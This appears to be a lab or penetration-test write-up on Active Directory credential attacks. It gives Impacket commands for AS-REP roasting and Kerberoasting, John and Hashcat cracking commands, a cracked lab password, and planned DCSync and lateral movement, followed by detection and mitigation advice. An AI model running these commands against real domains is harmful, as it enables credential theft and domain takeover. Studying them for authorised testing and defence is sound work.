# Kerberoasting Attack

## Overview

During our Active Directory enumeration with BloodHound, we identified that the user `EVANGELINE.ISSI` possesses powerful replication privileges:
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

These permissions enable devastating post-exploitation attacks, particularly **DCSync**. This section demonstrates how to obtain this high-value account's credentials through Kerberos-based attacks.

## Attack Vectors

Multiple techniques can be employed to compromise accounts with elevated privileges:

- **AS-REP Roasting**: Targets accounts with Kerberos Pre-Authentication disabled
- **Kerberoasting**: Extracts service account credentials via TGS requests
- **Password Spraying**: Attempts common passwords across multiple accounts
- **Credential Dumping**: Extracts credentials from compromised systems

## AS-REP Roasting Attack

### Concept

AS-REP Roasting exploits a misconfiguration where Kerberos Pre-Authentication is disabled on user accounts. When Pre-Authentication is not required, attackers can request authentication data for any user and receive an encrypted response that can be cracked offline.

### Prerequisites

- Valid domain user credentials (or anonymous access in some configurations)
- Network connectivity to the Domain Controller
- Target account with "Do not require Kerberos preauthentication" enabled

### Identifying Vulnerable Accounts

Using Impacket's `GetNPUsers.py`:

```bash
# With credentials
impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request

# Without credentials (if anonymous access allowed)
impacket-GetNPUsers '<DOMAIN>/' -dc-ip <DC_IP> -usersfile users.txt -format hashcat
```

**Example:**
```bash
impacket-GetNPUsers 'draven.me/lowpriv:Password123' -dc-ip 192.168.1.10 -request
```

### Capturing the Hash

When a vulnerable account is identified, the tool returns an AS-REP hash in the following format:

```
$krb5asrep$23$EVANGELINE.ISSI@DRAVEN.ME:hash_data_here...
```

Save this hash to a file (e.g., `asrep_hash.txt`) for offline cracking.

### Hash Cracking

#### Using John the Ripper

John the Ripper is straightforward and efficient for this task:

```bash
# Basic cracking with default wordlist
john asrep_hash.txt

# Using a specific wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hash.txt

# Display cracked passwords
john --show asrep_hash.txt
```

#### Using Hashcat

For GPU-accelerated cracking:

```bash
# AS-REP hash mode is 18200
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Results

After successfully cracking the hash, we obtained:

- **Username**: `EVANGELINE.ISSI`
- **Password**: `Draven@123!`
- **Domain**: `draven.me`

These credentials can now be used for:
- DCSync attacks (due to replication privileges)
- Lateral movement
- Further privilege escalation
- Persistent access establishment

## Alternative: Kerberoasting

If AS-REP Roasting is not viable, **Kerberoasting** can target service accounts:

```bash
# Request service tickets
impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request

# Output in Hashcat format
impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt
```

Kerberoast hashes use Hashcat mode `13100` (TGS-REP) or John's `krb5tgs` format.

## Detection and Mitigation

### Detection Indicators

- **Event ID 4768**: Kerberos authentication ticket (TGT) requested with pre-authentication disabled
- **Event ID 4769**: Kerberos service ticket (TGS) requested for unusual accounts
- Unusual volume of Kerberos authentication requests
- Failed login attempts followed by successful AS-REP requests

### Mitigation Strategies

1. **Enforce Pre-Authentication**: Ensure all accounts require Kerberos Pre-Authentication
   ```powershell
   # Check for vulnerable accounts
   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
   
   # Remediate
   Set-ADAccountControl -Identity "username" -DoesNotRequirePreAuth $false
   ```

2. **Strong Password Policy**: Enforce complex, lengthy passwords (minimum 15 characters)

3. **Service Account Management**:
   - Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
   - Implement 25+ character passwords for service accounts

4. **Monitoring and Alerting**:
   - Monitor for accounts with Pre-Authentication disabled
   - Alert on anomalous Kerberos authentication patterns
   - Implement honeypot accounts to detect reconnaissance

5. **Privilege Review**: Regularly audit accounts with replication rights using BloodHound

## Tools Reference

| Tool | Purpose | Installation |
|------|---------|--------------|
| **Impacket** | AS-REP Roasting, Kerberoasting | `sudo apt install python3-impacket` |
| **John the Ripper** | Hash cracking | `sudo apt install john` |
| **Hashcat** | GPU-accelerated cracking | `sudo apt install hashcat` |
| **BloodHound** | AD enumeration and privilege mapping | See [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound) |

## Additional Resources

- [HackTricks: AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [MITRE ATT&CK: Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/)
- [Impacket GitHub Repository](https://github.com/SecureAuthCorp/impacket)
- [Kerberos Authentication Overview](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)

---

**⚠️ Legal Disclaimer**: This documentation is for authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain explicit written permission before conducting security assessments.